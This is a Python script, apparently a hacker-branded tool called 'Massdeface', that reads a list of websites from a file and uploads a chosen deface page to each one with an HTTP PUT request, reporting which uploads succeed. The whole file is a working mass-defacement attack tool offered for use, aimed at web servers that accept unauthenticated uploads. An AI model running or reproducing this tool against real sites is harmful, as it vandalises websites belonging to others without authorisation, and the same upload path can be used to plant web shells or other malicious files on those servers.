# -*- coding: utf-8 -*-

try:
    import requests
    import os.path
    import sys
except ImportError:
    exit("install requests and try again ...")

banner = """
888b     d888                                 888           .d888                          
8888b   d8888                                 888          d88P"                           
88888b.d88888                                 888          888                             
888Y88888P888  8888b.  .d8888b  .d8888b   .d88888  .d88b.  888888 8888b.   .d8888b .d88b.  
888 Y888P 888     "88b 88K      88K      d88" 888 d8P  Y8b 888       "88b d88P"   d8P  Y8b 
888  Y8P  888 .d888888 "Y8888b. "Y8888b. 888  888 88888888 888   .d888888 888     88888888 
888   "   888 888  888      X88      X88 Y88b 888 Y8b.     888   888  888 Y88b.   Y8b.     
888       888 "Y888888  88888P'  88888P'  "Y88888  "Y8888  888   "Y888888  "Y8888P "Y8888  
                                                                                           
                                                                                           
                                                                                by-Discodancer212
             Coded By :- DISCODANCER
 Github   :-www.github.com/DISCODANCER212
 

 """

b = '\033[31m'
h = '\033[32m'
m = '\033[00m'


def x(tetew):
    ipt = ''
    if sys.version_info.major > 2:
        ipt = input(tetew)
    else:
        ipt = raw_input(tetew)

    return str(ipt)


def aox(script, target_file="target.txt"):
    op = open(script, "r").read()
    with open(target_file, "r") as target:
        target = target.readlines()
        s = requests.Session()
        print("uploading file to %d website" % (len(target)))
        for web in target:
            try:
                site = web.strip()
                if site.startswith("http://") is False:
                    site = "http://" + site
                req = s.put(site + "/" + script, data=op)
                if req.status_code < 200 or req.status_code >= 250:
                    print(m + "[" + b + " FAILED!" + m + " ] %s/%s" % (site, script))
                else:
                    print(m + "[" + h + " SUCCESS" + m + " ] %s/%s" % (site, script))

            except requests.exceptions.RequestException:
                continue
            except KeyboardInterrupt:
                print;
                exit()


def main(__bn__):
    print(__bn__)
    while True:
        try:
            a = x("Enter your script deface name: ")
            if not os.path.isfile(a):
                print("file '%s' not found" % (a))
                continue
            else:
                break
        except KeyboardInterrupt:
            print;
            exit()

    aox(a)


if __name__ == "__main__":
    main(banner)